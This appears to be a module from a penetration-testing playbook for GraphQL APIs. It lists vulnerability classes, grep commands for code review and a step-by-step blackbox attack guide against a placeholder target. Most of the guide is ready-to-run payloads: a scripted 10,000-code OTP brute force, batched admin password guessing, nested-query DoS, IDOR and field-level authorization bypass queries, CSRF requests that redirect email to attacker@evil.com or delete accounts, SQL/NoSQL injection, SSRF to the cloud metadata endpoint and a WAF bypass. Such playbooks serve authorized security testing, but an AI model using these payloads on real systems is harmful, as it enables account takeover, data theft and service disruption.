# VULN MODULE — GraphQL
# Asset: webapp
# Append to asset/webapp/module.md when target exposes a GraphQL API
# Report ID prefix: WEB-GQL

## THREAT MODEL

GraphQL replaces REST with a single endpoint accepting structured queries.
Its flexibility introduces a unique attack surface:
- Schema introspection leaks the full data model
- Deeply nested queries exhaust server resources
- Mutations bypass REST-level authorization assumptions
- Batching enables brute force and rate limit evasion
- Type confusion and injection via unsanitized arguments
- Subscriptions open persistent channels for data leakage

## VULNERABILITY CLASSES

1. Introspection Enabled in Production    CWE-200  — full schema disclosure
2. Batch Query Abuse / Rate Limit Bypass  CWE-770  — brute force via batching
3. Nested Query DoS                       CWE-400  — depth/complexity unbounded
4. IDOR via Direct Object Reference       CWE-639  — ID-based object access
5. Authorization Logic Bypass            CWE-285  — field-level auth missing
6. GraphQL Injection                      CWE-89   — argument injection into resolvers
7. Introspection-Assisted Enumeration     CWE-200  — schema-guided attack planning
8. Subscription Data Leakage             CWE-200  — over-subscription to sensitive events
9. Alias Abuse for Response Confusion     CWE-436  — aliased fields bypass WAF rules
10. Type Juggling in Variables            CWE-843  — wrong type coercion in resolvers

## WHITEBOX STATIC ANALYSIS

```bash
# Find GraphQL entry points
grep -rn "graphql\|ApolloServer\|GraphQLSchema\|buildSchema\|makeExecutableSchema" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.rb"

# Find resolvers
grep -rn "resolve:\|resolver\|Query:\|Mutation:\|Subscription:" \
  --include="*.js" --include="*.ts"

# Authorization checks in resolvers (look for MISSING checks)
grep -rn "context\.user\|context\.auth\|isAuthenticated\|requireAuth\|checkPermission" \
  --include="*.js" --include="*.ts"
# Flag any resolver that does NOT reference auth context

# Depth / complexity limiting
grep -rn "depthLimit\|complexityLimit\|queryDepth\|maxDepth\|createComplexityRule" \
  --include="*.js" --include="*.ts"
# Missing = DoS via nested queries

# Introspection config
grep -rn "introspection.*false\|disableIntrospection\|NoSchemaIntrospectionCustomRule" \
  --include="*.js" --include="*.ts"
# If NOT found = introspection likely enabled in production

# Raw argument interpolation (injection)
grep -rn "resolve.*args\.\|resolver.*args\." --include="*.js" --include="*.ts" -A5
# Check: are args passed directly to DB queries or OS calls?

# Subscription resolvers
grep -rn "subscribe:\|Subscription:" --include="*.js" --include="*.ts" -A10
# Check: does subscription filter events by authenticated user?
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Introspection check
```bash
# Quick type list
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}'

# Full schema dump (queries, mutations, all fields + types):
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"query FullIntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"}'
# Pipe result into GraphQL Voyager (https://graphql-kit.com/graphql-voyager/) to visualize schema

# If introspection blocked, try field suggestion bypass (Apollo server):
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__typ__ename}"}'
# Or use clairvoyance (see TOOLS) to enumerate schema via suggestions
```

### Step 2 — Rate limit bypass: aliased queries (same request, no array)

GraphQL aliases let you call the same field/mutation multiple times in one request
with different arguments — all processed in a single HTTP request, bypassing
per-request rate limits:

```graphql
# OTP brute-force via aliases (single HTTP request, no batch array needed)
{
  a0001: verifyOtp(code: "0001") { success }
  a0002: verifyOtp(code: "0002") { success }
  a0003: verifyOtp(code: "0003") { success }
  a0004: verifyOtp(code: "0004") { success }
  # ... generate all 10000 aliases for 4-digit OTP
}
```

```bash
# Generate full OTP alias payload:
python3 -c "
import json
queries = ' '.join([f'a{i:04d}: verifyOtp(code: \"{i:04d}\") {{ success }}' for i in range(10000)])
print(json.dumps({'query': '{' + queries + '}'}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' -d @-
```

### Step 2b — Batch query brute force (array syntax)
```python
# Batch multiple mutations in one request using JSON array syntax
import json, requests

batch = [
    {"query": f'mutation{{login(email:"admin@target.com",password:"{pw}"){{token}}}}'}
    for pw in ["password","123456","admin","letmein","qwerty","P@ssw0rd"]
]
r = requests.post("https://target.com/graphql",
                  json=batch,
                  headers={"Content-Type": "application/json"})
print(r.json())
```

### Step 3 — Nested query DoS
```graphql
# Send this — if no depth limit, server will process O(n^depth) nodes
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends { id name }
            }
          }
        }
      }
    }
  }
}
```
Confirm: does response time increase linearly with depth?
Report only if: server takes >5s or times out. Pure DoS is usually out of scope —
report only if query timeout is misconfigured and causes cascading DB load.

### Step 4 — IDOR via direct ID reference
```graphql
# Authenticated as user 1, try to access user 2's private data
{
  user(id: 2) { email phone address paymentMethods { last4 } }
}
# Also try UUID enumeration if IDs are sequential
```

### Step 5 — Authorization bypass — horizontal field access
```graphql
# Authenticated as low-priv user, try to access admin-only fields
{
  users { id email role passwordHash apiKeys { key } }
}
# Also try via aliases to confuse field-level auth:
{
  a: user(id: 1) { email }
  b: user(id: 2) { email }
}
```

### Step 5b — CSRF in GraphQL

GraphQL has no built-in CSRF protection. Exploitable when all four conditions hold:
1. Sessions managed via cookies (not Authorization header)
2. Mutation performs state-changing action
3. No anti-CSRF token or special header required
4. Content-Type does not trigger CORS preflight (`application/x-www-form-urlencoded` or `text/plain`)

```bash
# Test: does mutation work with form-encoded content-type?
curl -s -X POST https://target.com/graphql \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'query=mutation{updateEmail(email:"attacker@evil.com"){success}}'

# Test: GET-based mutation (worst case)
curl -s "https://target.com/graphql?query=mutation{deleteAccount{success}}" \
  -H "Cookie: session=VALID_SESSION"
```

### Step 6 — Injection via arguments
```graphql
# SQL injection in string argument
{ products(search: "' UNION SELECT username,password FROM users--") { name } }

# NoSQL injection in filter
{ users(filter: "{\"$gt\":\"\"}") { email } }

# SSRF via URL argument
{ fetchPreview(url: "http://169.254.169.254/latest/meta-data/") { content } }
```

### Step 7 — Alias WAF bypass
```graphql
# WAF blocks "password" field — use alias
{
  u: user(id: 1) {
    p: password
    h: passwordHash
  }
}
```

### Step 8 — Subscription enumeration
```javascript
// WebSocket-based subscription test
const ws = new WebSocket('wss://target.com/graphql', 'graphql-ws');
ws.onopen = () => ws.send(JSON.stringify({
  type: 'start',
  payload: { query: 'subscription { allMessages { content sender } }' }
}));
ws.onmessage = (e) => console.log(JSON.parse(e.data));
// Does this return messages from ALL users, not just the authenticated one?
```

## TOOLS

```bash
# InQL — Burp extension for GraphQL scanning (tabs, schema import, query builder)
# Install from BApp Store or: https://github.com/doyensec/inql

# graphw00f — fingerprint GraphQL server engine
pip install graphw00f
graphw00f -t https://target.com/graphql

# clairvoyance — enumerate full schema via field suggestions (when introspection disabled)
pip install clairvoyance
clairvoyance -t https://target.com/graphql -w wordlist.txt

# graphql-cop — automated security checks (10+ tests including CSRF, introspection, DoS)
pip install graphql-cop
graphql-cop -t https://target.com/graphql

# BatchQL — batch query and mutation testing
git clone https://github.com/assetnote/batchql
python3 batch.py -e https://target.com/graphql

# Misconfig Mapper — detect GraphQL targets and common misconfigurations
# https://github.com/intigriti/misconfig-mapper

# GraphQL Voyager — visualize introspection result as interactive schema graph
# https://graphql-kit.com/graphql-voyager/ (paste introspection JSON)
```
